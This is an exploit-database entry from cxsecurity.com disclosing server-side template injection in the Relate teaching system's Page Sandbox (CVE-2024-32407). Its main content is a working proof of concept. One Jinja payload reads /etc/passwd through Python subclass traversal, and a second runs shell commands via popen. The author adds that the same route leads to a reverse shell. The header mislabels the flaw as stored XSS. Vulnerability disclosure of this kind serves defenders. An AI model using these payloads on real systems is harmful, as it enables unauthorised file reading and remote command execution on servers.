
[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **Relate Learning And Teaching system Version before 2024.1 SSTI(Page Sandbox function) lead to RCE** **2024.04.21** **jp [kai6u](https://cxsecurity.com/author/kai6u/1/) **(JP)** jp** Risk: **Low** Local: **No** Remote: ****Yes**** CVE: **[CVE-2024-32407(Reserved)](https://cxsecurity.com/cveshow/CVE-2024-32407%28Reserved%29/ "Click to see CVE-2024-32407(Reserved)")** CWE: **N/A** | | --- | |
| --- | --- | --- | --- |

# Exploit Title: Relate Learning And Teaching system Version before 2024.1 Stored XSS
# Date: 18/04/2024
# Exploit Author: kai6u
# Vendor Homepage: https://github.com/inducer/
# Software Link: https://github.com/inducer/relate
# Version: 2024.1 (https://github.com/inducer/relate/commit/2fdbd4480a2d0a45c746639be244a61a0d4112b6)
# Tested on: Ubuntu 22.04
# CVE : CVE-2024-32407(Reserved)
\* SSTI is in the Page Sandbox feature, which allows user to check flow pages before publish.
1) The attacker uses the Page Sandbox feature to plant the following payload.
\* Payload:
\* {{ 'abc'.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()[111].\_\_subclasses\_\_()[0].\_\_subclasses\_\_()[0]('/etc/passwd').read() }}
\* Note that the subclasses index number in the payload depends on the python version, so it must be changed depending on the environment.
2) Click an Preview including the above payload.
\* Then you will see that the contents of the `/etc/passwd` file are output at the Content Preview block.
3) Next, the attacker modifies the above payload to execute arbitrary commands by changing the subclasses index number to the number of popen.
\* Payload:
\* {{ 'abc'.\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()[210]('whoami',shell=True,stdout=-1).communicate()[0].strip() }}
4) Click an Preview including the above payload.
\* If you check the results, you will see that `ubuntu` is displayed, which is the result of executing the whoami command.
\* An attacker can use this feature to execute reverse shell.

**##### References:**

 https://book.hacktricks.xyz/v/jp/pentesting-web/ssti-server-side-template-injection

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024040049)
[Tweet](https://twitter.com/share)

Vote for this issue:

 1
 0

100%
0%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top

